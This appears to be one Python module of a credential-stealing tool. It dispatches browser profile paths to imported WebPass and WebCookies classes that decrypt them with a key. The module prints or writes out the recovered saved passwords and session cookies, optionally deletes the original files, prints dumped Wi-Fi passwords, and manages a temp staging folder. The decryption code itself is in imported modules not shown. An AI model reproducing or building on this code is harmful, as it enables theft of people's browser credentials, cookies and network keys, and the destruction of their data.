from .WebPasswords import WebPass,remove
from .WebCookies import WebCookies
from .WifiPasswords import WifiPass
from tempfile import gettempdir
from shutil import rmtree
from os.path import join as pathJoin
from os import mkdir

def outEverything(pathes,key,typeof,rem=False,out=False,Data=None):
    if typeof =='wifi':
        outWifi(Data,True)
        return 
    types = {
        'webpass': WebPass(),
        'cookies': WebCookies()
    }
    if out:open(out,'w')
    for i in pathes:
        data = types[typeof].show(i,key,collor=(out==False))
        if not out: print(data)
        else: 
            f = open(out,'a')
            f.write(data),f.close()
        if rem: remove(i)

def outWifi(out,collor=False):
    if collor: print(WifiPass().sortCollored(out))


def gentempDir(name,rem=False):
    path = pathJoin(gettempdir(),name)
    if rem:
        rmtree(path)
    try: mkdir(path)
    except: pass
    return path


